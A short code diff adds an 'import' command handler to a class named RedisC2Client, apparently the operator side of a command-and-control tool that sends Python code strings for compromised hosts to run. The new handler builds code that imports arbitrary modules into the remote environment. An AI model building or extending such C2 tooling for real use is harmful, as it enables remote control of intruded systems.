@@ -81,6 +81,12 @@ class RedisC2Client:
     def handle_exit(self, args):
         raise SystemExit
 
+    def handle_import(self, args):
+        if len(args) != 1:
+            return print("usage: import MODULE")
+        [mod] = args
+        return f"globals().update({{{mod!r}:__import__({mod!r})}})"
+
     def _handle_user_command(self, command):
         result = command.strip()
         if not result:
